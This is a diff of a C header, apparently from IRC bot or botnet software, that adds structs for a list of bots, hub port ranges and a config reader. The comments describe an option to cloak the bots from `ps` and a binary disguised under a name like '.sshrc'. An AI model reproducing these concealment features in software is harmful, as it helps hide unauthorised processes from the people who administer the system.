@@ -1,6 +1,30 @@
 #ifndef _SHELL_H
 #define _SHELL_H
 
+typedef struct conf_bot_b {
+  char *nick;
+  char *host;
+  char *host6;
+  char *ip;
+  char *ip6;
+  int pid;              /* contains the PID for the bot (read for the pidfile) */
+  int localhub;         /* bot is localhub */
+  struct conf_bot_b *next;
+} conf_bot;
+
+typedef struct conf_b {
+  uid_t uid;
+  char *uname;
+  int pscloak;          /* should the bots bother trying to cloak `ps`? */
+#ifdef HUB
+  int portrange;        /* for hubs, the reserved port range for incoming connections */
+#endif /* HUB */
+  char *binpath;        /* path to binary, ie: ~/ */
+  char *binname;        /* binary name, ie: .sshrc */
+  conf_bot *bots;       /* the list of bots */
+} conf_t;
+
+
 #define ERR_BINSTAT     1
 #define ERR_BINMOD      2
 #define ERR_PASSWD      3
@@ -35,6 +59,9 @@
 
 
 #ifndef MAKING_MODS
+void init_conf();
+void free_conf();
+int readconf();
 char *homedir();
 char *my_uname();
 char *confdir();
